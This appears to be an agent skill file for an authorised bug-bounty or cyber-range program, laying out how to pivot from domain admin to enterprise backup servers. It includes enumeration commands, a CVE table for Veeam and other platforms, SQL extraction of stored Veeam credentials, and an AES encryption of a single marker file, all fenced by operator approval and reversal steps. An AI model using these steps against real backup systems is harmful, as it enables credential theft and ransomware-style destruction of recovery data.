---
name: attack-backup-pivot
description: Pivot from `admin:<domain>` (or a dedicated backup-admin cred) to the enterprise backup server — Veeam / Veritas / Acronis / Commvault / RuBackup — and prove destructive control by encrypting ONE marker file (`standoff365_hack_me`) on the backup disks. The milestone-5 НС oracle. NON-DESTRUCTIVE outside the marker, period.
category: post-foothold
tags: [backup, veeam, veritas, acronis, commvault, rubackup, ransomware-anti-recovery, inhibit-recovery, destructive-marker-only]
cwe_ids: [CWE-287, CWE-732, CWE-306]
chains_with: [attack-ad-recon, attack-adcs, attack-privesc, attack-lateral, attack-loot]
tools: [impacket, bloodyAD, netexec, veeam-cve-pocs, chisel, leash-foothold.sh, guard.py]
version: "1.0"
---

# Backup-system compromise (НС oracle, 1 000 000 ₽)

## Objective
Hold **admin on the backup console** and prove the ability to destroy / encrypt all protected
backups, demonstrated by encrypting **exactly one** test file `standoff365_hack_me` on the backup
server's backup disks + screenshot the backup-admin console under the admin account. ATT&CK T1490
(Inhibit System Recovery) + T1486 (Data Encrypted for Impact), **scoped to the single marker file**.

> **The marker file is the PROGRAM'S, not hardcoded.** `standoff365_hack_me` (and the ₽ reward in the
> title) are the Standoff 365 "unacceptable event" default example; set
> `objective.oracle_markers.backup_marker_file` in `scope.yaml` for a different program. The destructive-
> control proof is program-agnostic — only the one marker file it encrypts changes.

## Gate — THE strictest gate in Spider
- `stage: post-foothold`
- `requires: ["admin:<domain>"] OR ["creds:<backup-admin>@<host>"]`
- **Operator GO required explicitly for THIS CLASS**, separately from the generic post-foothold GO.
  Milestone-5 NEVER runs unattended — operator stays on-call during the demonstration.
- `scope.policies.forbidden` already carries `destructive`, `encryption-outside-marker`,
  `data-exfiltration-beyond-poc` — this skill reinforces them: the ONLY file ever touched by write/
  encrypt is `standoff365_hack_me`, and ONLY once, on the backup-server disks.
- Operator must notify the program's SOC (contact from `scope.yaml`) BEFORE the final proof step per the program's
  "боевое реагирование" + "выбивать атакующих" posture — a coordinated proof window is standard.

## Methodology — platform-fingerprint first, exploit second

### 1. Discover the backup platform (from the post-foothold position)
Inside the network, with `admin:<domain>` or a reachable backup-admin cred:
```bash
# From the Linux foothold (leash-foothold):
bin/nxc smb <subnet>/24 -u <admin> -p <pwd> --shares | grep -iE 'backup|veeam|veritas|commvault|acronis|rubackup'
bin/nxc smb <bak-host> -u <admin> -p <pwd> -x "Get-Service | ? {$_.DisplayName -like '*backup*' -or $_.DisplayName -like '*veeam*'}"
bin/.pyenv/Scripts/wmiexec.py '<DOM>/<admin>:<pwd>@<bak-host>' 'reg query HKLM\\SOFTWARE /s /f "Veeam"'
```
Scan backup-common ports (always leashed, host-pinned):
```bash
bin/naabu -host <bak-host> -p 9392,9393,9401,9420,10000,10001,10002,10003,13724,13782,22,443,1801,8443,8900,9080,9870 -json
```

### 2. Match fingerprint to the public playbook
| Platform | Signature | Known public CVE / technique |
|---|---|---|
| **Veeam Backup & Replication** | TCP 9392 (console) + 9393 (Mount) + 9401 (Agent) + 10001-10006 | **CVE-2024-40711** (unauth RCE ≤12.1.2.172, watchtowr PoC), **CVE-2023-27532** (cred leak from `VeeamBackup\\DbConfig`), CVE-2024-29849 (VBEM auth-bypass), CVE-2024-40715 (TLS cert bypass), **ConfigDB-cred-dump pattern** (NTLM/DPAPI-decryptable creds in SQL `VeeamBackup` DB — frequent initial-access ride once you hold the SQL account). |
| **Veritas NetBackup** | TCP 1556 / 13782 / 13724 | NBU PBX misauth, DeepX / Flex Appliance CVEs; cross-reference by version. |
| **Acronis Cyber Protect** | TCP 44445 / 7780 / 9877 (agent) + web 9877 | CVE-2022-3405 family; Service-account tokens in registry. |
| **Commvault** | TCP 8400-8410 (comm) | CVE-2025-3928 family (unauth RCE), Metallic cloud SAML separately. |
| **RuBackup** (RF-popular) | TCP 5577 / web 8888 | Fewer public CVEs; recon API endpoints, service-account cred reuse. |

### 3. Choose the proof technique (ONLY one platform, ONLY the marker)
Veeam path (most common in enterprise RF stacks):
```bash
# Step A — SQL ConfigDB cred extraction (requires SMB admin on Veeam server OR MSSQL SA)
bin/.pyenv/Scripts/mssqlclient.py '<DOM>/<admin>:<pwd>@<veeam-sql>' -windows-auth
# > SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials]
# → decrypt with Veeam.Backup.Common.ProtectedStorage on the Veeam host (DPAPI-key available)

# Step B — Veeam console / PowerShell cmdlets (admin login proves milestone-5 BEFORE the encrypt step):
#   Add-PSSnapin VeeamPSSnapIn; Connect-VBRServer -Server <veeam-host>; Get-VBRJob
# Screenshot the console: "Add user 'standoff365' to Veeam Users > Veeam Backup Administrator"
# — same marker pattern as milestone-3.

# Step C — THE encrypt-marker proof (ONE file, on backup repository disk, reversible):
#   On the proven backup-admin shell:
#     $f = '<repo-path>\\standoff365_hack_me'
#     Set-Content $f "pre-encrypt placeholder"
#     $k = [System.Security.Cryptography.AesManaged]::new(); $k.GenerateKey(); $k.GenerateIV()
#     # Encrypt in place, keep IV+SHA256(pre) in a sibling note file
#     $cipher = ...; [IO.File]::WriteAllBytes($f, $cipher)
#     Get-FileHash $f -Algorithm SHA256 > "$f.sha256"
#   Capture: Get-ChildItem $f ; file $f ; sha256sum $f.before $f ; screenshot of the backup console
#   showing <repo-path> under the admin user.
```

### 4. Milestone-5 oracle (the only thing that pays 1M ₽)
Report must demonstrate:
1. **Backup-admin console screenshot** under a privileged account — the "I own backups" proof.
2. **`standoff365_hack_me` file on the backup server's backup repository disk**, encrypted in place
   (binary ≠ plaintext; sha256 before/after; AES params captured so the file is reversible by the customer).
3. **Reproducibility chain** — pointers back to every prior proof: perimeter (M2), DA (M3), virt
   admin (M4 if that path was taken) / backup-admin alternative, with timestamps per the program's
   report requirements.
4. **Nothing else touched** — proof of non-destruction via directory listings and SHA256 of the
   rest of the repository tree before/after the encrypt step (identical).

## Hard constraints (the engagement-breakers)
- `standoff365_hack_me` is the ONLY file that may be written, encrypted, deleted, or renamed on any
  backup infrastructure asset. If the marker file is not already present, create it empty FIRST, note
  the operator-created timestamp, THEN encrypt that same file. Nothing else.
- No deletion/encryption of other backups, no immutability-flag toggles across the repository, no
  retention-policy edits, no credential rotation on backup service accounts, no destructive
  cmdlet (`Remove-VBRJob`, `Remove-VBRBackup`, `Remove-VBRRepository`, etc).
- No RCE PoC that writes beyond the ONE marker — Veeam CVE PoCs that drop a webshell / Mimikatz /
  additional binaries must be post-processed to keep only the one-file-encrypt step on the proof run.
- Egress with backup data is forbidden — the marker file never leaves the backup repository, only
  the hashes + screenshots do.

## Oracle
- Hash of the marker before ≠ hash after, AND the before+after SHA256 are both reproducible by the
  program's reviewers.
- Backup-admin console screenshot shows the admin account logged in (watermark, timestamp, host).
- Directory listing diff of the backup repository (`Get-ChildItem -Recurse | Get-FileHash` before vs
  after) is **empty except for `standoff365_hack_me*`**.

## Reversal (operator action after the proof)
- Decrypt or restore the marker file to its pre-encrypt state using the captured AES params.
- Delete any residual sidecar notes (`.sha256`, `.aesparams`) created only for proof hygiene.
- Confirm with the program's SOC contact (from `scope.yaml`) that the file is restored.

## Chaining — this is a terminal class
Backup-pivot is the end of the kill-chain for THIS program (НС achieved). After this: `/report` builds
the submission, `/triage` runs adversarial-skeptic on the proof before send. No further exploitation.
